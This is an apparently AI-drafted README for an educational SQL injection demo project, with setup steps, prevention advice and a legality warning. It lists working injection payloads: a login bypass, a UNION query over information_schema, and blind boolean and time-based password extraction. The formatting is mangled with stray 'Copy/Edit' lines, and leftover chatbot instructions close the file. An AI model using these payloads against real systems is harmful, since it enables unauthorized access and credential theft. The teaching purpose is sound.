# SQL Injection Demonstration Project

![SQL Injection](https://img.shields.io/badge/Demo-SQL%20Injection-red) ![Educational](https://img.shields.io/badge/Purpose-Educational-blue)

This repository demonstrates SQL injection vulnerabilities in web applications.  
Originally forked from [sakshamchoudhary/sql](https://github.com/sakshamchoudhary/sql), it serves as an **educational resource** for understanding and preventing SQL injection attacks.

---

## 🚀 Quick Start

### 1. Clone the repository
```bash
git clone https://github.com/your-username/sql-injection-demo.git
cd sql-injection-demo
2. Install dependencies
bash
Copy
Edit
npm install
3. Set up MySQL database
bash
Copy
Edit
mysql -u root -p < database/schema.sql
4. Configure database credentials
Edit the file:

arduino
Copy
Edit
config/database.js
5. Run the vulnerable application
bash
Copy
Edit
node app.js
🔗 Access the app at:
http://localhost:3000

💉 SQL Injection Examples
🔓 Basic Login Bypass
vbnet
Copy
Edit
Username: admin' --
Password: [anything]
🕵️ Database Information Leakage
sql
Copy
Edit
' UNION SELECT 1,table_name,column_name FROM information_schema.columns --
🤫 Blind Boolean-Based Injection
sql
Copy
Edit
admin' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
⏳ Time-Based Injection
sql
Copy
Edit
admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) --
🛡️ Prevention Methods
✅ Parameterized Queries
javascript
Copy
Edit
db.query('SELECT * FROM users WHERE id = ?', [userId]);
✅ ORM Usage
javascript
Copy
Edit
User.findOne({ where: { username: inputUsername } });
✅ Input Validation
javascript
Copy
Edit
if (!/^[\w-]{3,20}$/.test(input)) {
    throw new Error('Invalid input');
}
✅ Principle of Least Privilege
Use database accounts with minimal required permissions.

✅ Web Application Firewall (WAF)
Deploy a WAF to monitor and block malicious inputs.

⚠️ Responsible Disclosure
Warning:
This project is intended strictly for educational purposes only.
Never test these techniques on systems you do not own or have explicit permission to test.
Unauthorized access or testing is illegal and unethical.

📝 License
This project is licensed under the MIT License.
See the LICENSE file for more details.

yaml
Copy
Edit

---

✅ **Now copy the full block above and paste it into your `README.md` file**.  
Let me know if you'd also like a `schema.sql` or `app.js` sample for the vulnerable app.
